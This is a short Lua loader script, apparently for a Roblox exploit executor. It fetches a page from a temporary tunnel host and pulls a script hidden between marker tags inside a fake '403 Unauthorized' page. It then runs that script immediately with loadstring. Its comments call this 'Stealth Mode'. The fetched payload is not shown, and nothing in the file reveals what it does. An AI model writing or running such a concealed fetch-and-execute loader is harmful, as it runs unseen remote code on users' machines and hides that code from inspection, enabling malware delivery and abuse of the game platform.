-- ZHuB Loader v3.0
-- Universal Script Entry Point (Stealth Mode)

local url = "https://cacd794576a9a3.lhr.life/api/index.html"
local success, result = pcall(function()
    return game:HttpGet(url)
end)

if success and result then
    -- Extract the hidden script from the 403 Unauthorized HTML page
    local scriptContent = result:match("%[ZHUB_DATA_START%](.-)%[ZHUB_DATA_END%]")
    if scriptContent then
        local func, err = loadstring(scriptContent)
        if func then
            func()
        else
            warn("[ZHuB] Syntax error in core: ", err)
        end
    else
        warn("[ZHuB] Could not extract script from secure endpoint. Ensure you are authorized.")
    end
else
    warn("[ZHuB] Failed to connect to secure server.")
end
